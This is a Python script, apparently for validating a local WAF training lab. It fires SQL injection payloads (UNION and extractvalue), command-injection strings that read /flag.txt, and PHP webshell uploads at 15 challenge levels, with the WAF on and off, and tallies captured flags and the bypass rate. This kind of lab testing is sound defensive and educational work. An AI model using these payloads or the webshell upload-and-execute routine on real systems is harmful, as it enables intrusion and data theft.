#!/usr/bin/env python3
"""
WAF 靶场批量攻击验证脚本 v3
测试所有 15 关: 5 SQLi + 5 CMDi + 5 Upload，WAF on/off

用法:
    python scripts/batch_attack.py
"""

import sys
import io
import json
import re
import subprocess
import os
import requests
import urllib.parse
from datetime import datetime

# Fix Windows stdout encoding
if sys.stdout.encoding != 'utf-8':
    try:
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    except (AttributeError, OSError):
        pass

BASE_URL = "http://localhost:8090"
RESULTS = []


def test_api(scenario, level, payload, encoding="none", waf="on"):
    """通过靶场 API 发起攻击（requests 库，正确处理 UTF-8）"""
    url = f"{BASE_URL}/api/attack.php"
    data = {
        "scenario": scenario,
        "level": level,
        "payload": payload,
        "encoding": encoding,
        "waf": waf
    }
    try:
        resp = requests.post(url, json=data, timeout=15)
        result = resp.json()

        if "error" in result:
            return {**result, "scenario": scenario, "level": level,
                    "payload": payload, "waf_enabled": waf == "on",
                    "waf_blocked": False, "flag": None, "_status": f"ERROR: {result['error']}"}

        flag = result.get("flag")
        blocked = result.get("waf_blocked", False)
        status = "BLOCKED" if blocked else ("FLAG" if flag else "PASSED")

        result["_status"] = status
        result["_waf_rule_id"] = result.get("waf_rule_id") or "-"
        return result
    except requests.exceptions.ConnectionError:
        return {"scenario": scenario, "level": level, "payload": payload,
                "waf_enabled": waf == "on", "waf_blocked": False, "flag": None,
                "_status": "ERROR: connection", "_waf_rule_id": "-"}
    except Exception as e:
        return {"scenario": scenario, "level": level, "payload": payload,
                "waf_enabled": waf == "on", "waf_blocked": False, "flag": None,
                "_status": f"ERROR: {e}", "_waf_rule_id": "-"}


def test_upload_internal(level, php_content, filename):
    """docker exec 进 app 容器直连测试上传（真正 WAF OFF）
    使用 stdin pipe 传文件内容，避免 shell 编码问题"""
    try:
        content_str = php_content if isinstance(php_content, str) else php_content.decode()

        # Shell script: write file, upload, execute, cleanup
        shell_script = (
            f"cat > /tmp/_s{level}.php && "
            f"curl -s -F 'file=@/tmp/_s{level}.php;filename={filename}' http://app:80/upload/level{level}.php && "
            f"echo '---SHELL_EXEC---' && "
            f"curl -s http://app:80/uploads/{filename} && "
            f"rm -f /tmp/_s{level}.php"
        )

        r = subprocess.run(
            ['docker', 'exec', '-i', 'waf-app', 'sh', '-c', shell_script],
            input=content_str,
            capture_output=True, encoding='utf-8', errors='replace', timeout=30
        )
        output = r.stdout

        # Parse: everything before ---SHELL_EXEC--- is upload page, after is shell exec output
        parts = output.split('---SHELL_EXEC---')
        upload_body = parts[0] if len(parts) > 0 else output
        shell_output = parts[1] if len(parts) > 1 else ''

        upload_ok = '上传成功' in upload_body or '文件已暂存' in upload_body
        flag = None
        fm = re.search(r'flag\{([^}]+)\}', shell_output)
        if fm:
            flag = fm.group(0)
        # Also check upload page for flag
        if not flag:
            fm = re.search(r'flag\{([^}]+)\}', upload_body)
            if fm:
                flag = fm.group(0)

        if flag:
            status = "FLAG"
        elif upload_ok:
            status = "UPLOAD_OK"
        else:
            status = "FAIL"

        return {
            "scenario": "upload", "level": level,
            "payload": f"file={filename}",
            "encoding": "none", "waf_enabled": False,
            "waf_blocked": False, "http_status": 200,
            "flag": flag, "_status": status, "_waf_rule_id": "-",
        }
    except Exception as e:
        return {"scenario": "upload", "level": level,
                "waf_enabled": False, "waf_blocked": False, "flag": None,
                "_status": f"ERROR: {e}", "_waf_rule_id": "-"}


def test_upload_waf(level, php_content, filename, extra_fields=None):
    """经 WAF 代理 (:8090) 测试上传（WAF ON）"""
    try:
        files = {'file': (filename, php_content, 'application/octet-stream')}
        data = extra_fields or {}
        resp = requests.post(f"http://localhost:8090/upload/level{level}.php",
                             files=files, data=data, timeout=15)
        body = resp.text
        http_code = resp.status_code

        blocked = (http_code == 403)
        flag = None
        fm = re.search(r'flag\{([^}]+)\}', body)
        if fm:
            flag = fm.group(0)
        upload_ok = '上传成功' in body or '文件已暂存' in body

        if blocked:
            status = "BLOCKED"
        elif flag:
            status = "FLAG"
        elif upload_ok:
            status = "UPLOAD_OK"
        else:
            status = f"HTTP{http_code}"

        return {
            "scenario": "upload", "level": level,
            "payload": f"file={filename}",
            "encoding": "none", "waf_enabled": True,
            "waf_blocked": blocked, "http_status": http_code,
            "flag": flag, "_status": status, "_waf_rule_id": "-",
        }
    except Exception as e:
        return {"scenario": "upload", "level": level,
                "waf_enabled": True, "waf_blocked": False, "flag": None,
                "_status": f"ERROR: {e}", "_waf_rule_id": "-"}


def print_result(i, total, label, result):
    waf_label = "WAF" if result.get("waf_enabled") else "RAW"
    status = result.get("_status", "?")
    icons = {"FLAG": "✅", "BLOCKED": "🛡️", "UPLOAD_OK": "📤", "PASSED": "⬜"}
    icon = icons.get(status, "⚠️")
    rule = str(result.get("_waf_rule_id", "-"))[:40]
    flag_info = f"  → {result['flag']}" if result.get("flag") else ""
    print(f"  [{i:2d}/{total}] {icon} {label:35s} {waf_label:4s} | {status:12s} | {rule}{flag_info}")


# ============================================================
# PAYLOADS (verified against source code)
# ============================================================

SQLI_PAYLOADS = {
    1: {"name": "SQLi L1 - 数字型UNION",
        "payload": "-1 UNION SELECT 1, flag, 3, description FROM flags"},
    2: {"name": "SQLi L2 - 字符型引号闭合",
        "payload": "' UNION SELECT 1, flag, challenge, description FROM flags-- -"},
    3: {"name": "SQLi L3 - LIKE搜索型",
        "payload": "' UNION SELECT 1, flag, description FROM flags-- -"},
    4: {"name": "SQLi L4 - ORDER BY盲注",
        "payload": "extractvalue(1,concat(0x7e,(SELECT flag FROM flags WHERE challenge='sqli_l4'),0x7e))"},
    5: {"name": "SQLi L5 - 布尔盲注",
        "payload": "1 AND extractvalue(1,concat(0x7e,(SELECT flag FROM flags WHERE challenge='sqli_l5'),0x7e))"},
}

CMDI_PAYLOADS = {
    1: {"name": "CMDi L1 - 基础拼接",
        "payload": ";cat /flag.txt"},
    2: {"name": "CMDi L2 - 参数位注入",
        "payload": ";cat /flag.txt"},
    3: {"name": "CMDi L3 - 嵌套执行",
        "payload": "||cat /flag.txt"},
    4: {"name": "CMDi L4 - 环境变量投毒",
        "payload": "cat /flag.txt"},
    5: {"name": "CMDi L5 - OOB外带(无回显)",
        "payload": ";cat /flag.txt>/var/www/html/uploads/flag_l5.txt"},
}

UPLOAD_PAYLOADS = {
    1: {"name": "Upload L1 - 基础上传",
        "content": '<?php system("cat /flag.txt"); ?>', "filename": "shell_l1.php"},
    2: {"name": "Upload L2 - 目录可控",
        "content": '<?php system("cat /flag.txt"); ?>', "filename": "shell_l2.php",
        "extra": {"dir": "."}},
    3: {"name": "Upload L3 - Content-Type",
        "content": '<?php system("cat /flag.txt"); ?>', "filename": "shell_l3.php"},
    4: {"name": "Upload L4 - 编码截断",
        "content": '<?php system("cat /flag.txt"); ?>', "filename": "shell_l4.php"},
    5: {"name": "Upload L5 - 条件竞争",
        "content": '<?php system("cat /flag.txt"); ?>', "filename": "shell_l5.php"},
}


def main():
    print("=" * 90)
    print("  WAF 靶场批量攻击验证 v3")
    print(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  目标: {BASE_URL}")
    print(f"  WAF:  OWASP ModSecurity CRS PL4")
    print("=" * 90)

    # Phase 1: SQLi WAF OFF
    print("\n" + "─" * 90)
    print("  📌 Phase 1: SQL 注入 — 明文基准 (WAF OFF)")
    print("─" * 90)
    for level in range(1, 6):
        info = SQLI_PAYLOADS[level]
        r = test_api("sqli", level, info["payload"], waf="off")
        print_result(level, 5, info["name"], r)
        RESULTS.append(r)

    # Phase 2: SQLi WAF ON
    print("\n" + "─" * 90)
    print("  📌 Phase 2: SQL 注入 — WAF 绕过测试 (WAF ON)")
    print("─" * 90)
    for level in range(1, 6):
        info = SQLI_PAYLOADS[level]
        r = test_api("sqli", level, info["payload"], waf="on")
        print_result(5 + level, 5, info["name"], r)
        RESULTS.append(r)

    # Phase 3: CMDi WAF OFF
    print("\n" + "─" * 90)
    print("  📌 Phase 3: 命令注入 — 明文基准 (WAF OFF)")
    print("─" * 90)
    for level in range(1, 6):
        info = CMDI_PAYLOADS[level]
        r = test_api("cmdi", level, info["payload"], waf="off")
        print_result(10 + level, 5, info["name"], r)
        RESULTS.append(r)

    # Phase 4: CMDi WAF ON
    print("\n" + "─" * 90)
    print("  📌 Phase 4: 命令注入 — WAF 绕过测试 (WAF ON)")
    print("─" * 90)
    for level in range(1, 6):
        info = CMDI_PAYLOADS[level]
        r = test_api("cmdi", level, info["payload"], waf="on")
        print_result(15 + level, 5, info["name"], r)
        RESULTS.append(r)

    # Phase 5: Upload WAF OFF (docker exec 直连)
    print("\n" + "─" * 90)
    print("  📌 Phase 5: 文件上传 — 明文基准 (docker exec 直连 app, 绕过 WAF)")
    print("─" * 90)
    for level in range(1, 6):
        info = UPLOAD_PAYLOADS[level]
        r = test_upload_internal(level, info["content"], info["filename"])
        print_result(20 + level, 5, info["name"], r)
        RESULTS.append(r)

    # Phase 6: Upload WAF ON
    print("\n" + "─" * 90)
    print("  📌 Phase 6: 文件上传 — WAF 绕过测试 (经 :8090 WAF)")
    print("─" * 90)
    for level in range(1, 6):
        info = UPLOAD_PAYLOADS[level]
        r = test_upload_waf(level, info["content"], info["filename"],
                            extra_fields=info.get("extra"))
        print_result(25 + level, 5, info["name"], r)
        RESULTS.append(r)

    # ================================================================
    # Summary
    # ================================================================
    print("\n" + "=" * 90)
    print("  📊 批量攻击验证结果汇总")
    print("=" * 90)

    total = len(RESULTS)

    for scenario, label in [("sqli", "SQL 注入"), ("cmdi", "命令注入"), ("upload", "文件上传")]:
        subset = [r for r in RESULTS if r.get("scenario") == scenario]
        waf_on = [r for r in subset if r.get("waf_enabled")]
        waf_off = [r for r in subset if not r.get("waf_enabled")]

        off_flag = sum(1 for r in waf_off if r.get("flag"))
        off_ok = sum(1 for r in waf_off if r.get("_status") in ("FLAG", "UPLOAD_OK"))
        on_flag = sum(1 for r in waf_on if r.get("flag"))
        on_blocked = sum(1 for r in waf_on if r.get("waf_blocked"))
        on_ok = sum(1 for r in waf_on if r.get("_status") in ("FLAG", "UPLOAD_OK"))

        print(f"\n  {label} ({len(subset)} 次):")
        print(f"    WAF OFF: {off_flag} flag | {off_ok}/{len(waf_off)} 漏洞验证通过")
        print(f"    WAF ON:  {on_flag} flag | {on_blocked} 被拦截 | {on_ok - on_flag} 上传成功无flag | "
              f"{len(waf_on) - on_blocked - on_ok} 其他通过")

    # Overall
    waf_on_all = [r for r in RESULTS if r.get("waf_enabled")]
    waf_off_all = [r for r in RESULTS if not r.get("waf_enabled")]

    waf_on_blocked = sum(1 for r in waf_on_all if r.get("waf_blocked"))
    waf_on_flag = sum(1 for r in waf_on_all if r.get("flag"))
    waf_off_flag = sum(1 for r in waf_off_all if r.get("flag"))

    bypass_rate = round((len(waf_on_all) - waf_on_blocked) / len(waf_on_all) * 100, 1) if waf_on_all else 0

    print(f"\n  {'─' * 60}")
    print(f"  总测试数:            {total}")
    print(f"  WAF OFF 基准测试:    {len(waf_off_all)} 次, {waf_off_flag} 拿 flag")
    print(f"  WAF ON  实战测试:    {len(waf_on_all)} 次, {waf_on_flag} 拿 flag")
    print(f"  WAF 拦截:            {waf_on_blocked}/{len(waf_on_all)} ({round(waf_on_blocked/len(waf_on_all)*100,1)}%)")
    print(f"  WAF 绕过率:          {bypass_rate}% (请求到达后端)")
    print(f"  flag成功率(WAF ON):  {round(waf_on_flag/len(waf_on_all)*100,1)}%")
    print(f"  {'─' * 60}")

    # Save
    os.makedirs("logs", exist_ok=True)
    with open("logs/batch_results.json", "w", encoding="utf-8") as f:
        json.dump(RESULTS, f, ensure_ascii=False, indent=2)
    print(f"\n  📁 详细 JSON: logs/batch_results.json")

    # Bypass detail
    print(f"\n  🎯 WAF ON 下成功的攻击:")
    bypasses = [r for r in RESULTS if r.get("waf_enabled") and r.get("flag")]
    if bypasses:
        for b in bypasses:
            print(f"    ✅ {b['scenario']}/L{b['level']}: {b['flag']}")
    # Also show UPLOAD_OK under WAF
    upload_ok_waf = [r for r in RESULTS if r.get("waf_enabled") and r.get("_status") == "UPLOAD_OK"]
    if upload_ok_waf:
        for u in upload_ok_waf:
            print(f"    📤 {u['scenario']}/L{u['level']}: 上传成功 (但未拿flag, webshell 可能需要手动访问)")

    blocked_detail = [r for r in RESULTS if r.get("waf_blocked")]
    if blocked_detail:
        print(f"\n  🛡️ WAF 拦截明细:")
        for b in blocked_detail:
            rule = b.get("_waf_rule_id", "-")[:50]
            print(f"    {b['scenario']}/L{b['level']}: rules={rule}")

    print("\n" + "=" * 90)
    return 0


if __name__ == "__main__":
    sys.exit(main())
